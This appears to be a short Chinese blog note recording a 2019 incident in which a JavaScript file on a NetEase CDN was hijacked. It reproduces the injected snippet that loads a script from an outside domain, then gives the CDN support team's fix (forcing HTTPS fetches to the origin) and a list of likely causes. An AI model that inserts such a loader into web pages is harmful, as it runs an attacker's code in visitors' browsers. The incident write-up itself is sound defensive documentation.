
---
title: Nosdn https的js文件劫持
date: Wed Mar 06 2019 16:24:52 GMT+0800 (CST)
tags:

---

```http
Request URL: https://dealer.nosdn.127.net/test/dealer_webapp/static/js/manifest.9283e61d.js
Request Method: GET
Status Code: 200 OK
Remote Address: 183.131.168.145:443
Referrer Policy: no-referrer-when-downgrade
```

```
(function(){var l=document.createElement('script');l.src='https://gov.papastars.com/dlhao.min.js';document.getElementsByTagName('body')[0].appendChild(l);})();(function(){var l=document.createElement('script');l.src='http://dealer.nosdn.127.net/http://dealer.nosdn.127.net/test/dealer_webapp/static/js/manifest.9283e61d.js';document.getElementsByTagName('body')[0].appendChild(l);})();
```

```
NOS值班  3月6日 15:42:42
这个要根治，需要把cdn回源改成https。这个有2步：
NOS值班  3月6日 15:42:55
1.修改回源host；2.启用https回源

NOS值班  3月8日 14:30:10
加速域名：dealer.nosdn.127.net
当前配置：
源站：nos.netease.com
回源HOST：无

修改配置：
源站：nos.netease.com
回源HOST：dealer.nos-hz.163yun.com
回源协议：强制https回源
```

HTTPS DNS劫持案例
https://testudy.cc/tech/2016/10/27/hijacking.html
```
HTTPS的静态文件被劫持，可能存在的情况主要有下面三种情况：

证书泄露（被劫持的js文件是一个大公司的文件，证书泄露可能性较小）；
中间人劫持；
CDN回源路径中存在劫持。
```


应对流量劫持，前端能做哪些工作？
https://www.zhihu.com/question/35720092/answer/523563873